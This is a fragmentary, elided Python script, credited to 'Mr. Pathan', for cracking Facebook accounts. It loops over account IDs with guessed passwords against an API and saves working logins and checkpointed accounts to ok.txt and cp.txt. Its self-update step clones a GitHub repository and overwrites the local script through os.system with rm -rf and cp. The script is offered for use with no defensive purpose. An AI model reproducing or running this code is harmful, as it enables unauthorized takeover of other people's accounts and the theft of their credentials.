...
#AUTHOR : AIJAZ MUHMAND (MR. PATHAN)
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO MR. PATHAN
...
def main():
	...
	print("\033[96;1m  [J] JOIN MR. MUHMAND  GROUP \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/Aijaz-Muhmand/fcpathan")
			os.system("rm -rf haripro.py")
			os.system("cp -f haripro/haripro.py \\.")
...
def token():
    os.system("clear")
    try:
        token = open("haripro_token.txt", "r").read()
        menu()
...
def token_check():
	try:
		...
		os.system('rm -rf haripro_token.txt')
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[HARI-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[HARI-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[HARI-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[HARI-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[HARI-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[HARI-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
